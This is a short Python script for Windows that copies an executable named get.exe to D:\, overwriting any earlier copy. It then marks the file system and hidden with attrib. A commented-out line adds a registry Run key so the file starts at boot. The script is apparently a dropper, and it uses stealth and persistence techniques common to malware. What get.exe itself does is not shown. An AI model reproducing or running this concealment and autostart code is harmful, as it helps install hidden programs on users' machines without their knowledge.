import winsound, os, shutil

try:
    os.remove('D:\get.exe')
except:
    pass
try:
    shutil.copy('./get.exe', 'D:\get.exe')
except:
    pass
os.system(r'attrib +s +h "D:\get.exe"')
# os.popen(
#     r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MyFile /t REG_SZ /d "D:\get.exe" /f')
winsound.MessageBeep(3)
